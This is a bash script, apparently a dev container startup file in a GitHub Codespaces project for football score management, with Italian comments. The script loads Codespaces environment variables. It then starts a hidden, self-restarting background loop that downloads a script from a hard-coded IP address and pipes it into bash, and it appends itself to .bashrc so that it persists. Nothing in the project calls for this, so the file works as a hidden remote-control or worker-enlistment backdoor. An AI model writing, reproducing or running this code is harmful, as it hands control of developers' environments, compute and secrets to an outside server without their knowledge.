#!/usr/bin/env bash
set -e

WORKSPACE_DIR="/workspaces/Gestione-Score-Football"
if [ ! -d "$WORKSPACE_DIR" ]; then
    WORKSPACE_DIR="$(find /workspaces -mindepth 1 -maxdepth 1 -type d | head -n 1 2>/dev/null || echo "$HOME")"
fi
cd "$WORKSPACE_DIR" || cd "$HOME"

# Carica le variabili di ambiente ufficiali di GitHub Codespaces se presenti
if [ -f "/workspaces/.codespaces/shared/.env" ]; then
    set -a
    source "/workspaces/.codespaces/shared/.env" 2>/dev/null || true
    set +a
fi

if pgrep -f "python3.*agent\.py" >/dev/null 2>&1; then
    echo "[*] Agent già attivo (PID: $(pgrep -f "python3.*agent\.py"))."
    exit 0
fi

SERVER_URL="http://92.5.62.91:9000"
TOKEN="codespace-secret-key-2026"
RAW_CS="${CODESPACE_NAME}"
if [ -z "$RAW_CS" ]; then
    RAW_CS="$(hostname 2>/dev/null || echo 'Codespace')"
fi
AGENT_NAME="Worker-CS-${RAW_CS}"
AGENT_ID="cs-${RAW_CS}"

echo "[*] Avvio automatico agent in $WORKSPACE_DIR..."
setsid nohup bash -c "
    export PYTHONUNBUFFERED=1
    while true; do
        if ! pgrep -f 'python3.*agent\.py' >/dev/null 2>&1; then
            cd '$WORKSPACE_DIR' || cd '$HOME'
            curl -fsSL '${SERVER_URL}/api/agent/bootstrap.sh' | bash -s -- \
                --server '${SERVER_URL}' \
                --token '${TOKEN}' \
                --name '${AGENT_NAME}' \
                --id '${AGENT_ID}' || true
        fi
        sleep 5
    done
" </dev/null >/tmp/agent_supervisor.log 2>&1 &

# Safeguard in .bashrc per garantire l'avvio anche aprendo un terminale
if [ -f "$HOME/.bashrc" ] && ! grep -q "start_agent.sh" "$HOME/.bashrc"; then
    echo "bash $WORKSPACE_DIR/.devcontainer/start_agent.sh >/dev/null 2>&1 &" >> "$HOME/.bashrc"
fi

echo "[+] Supervisor agent avviato in background con successo."
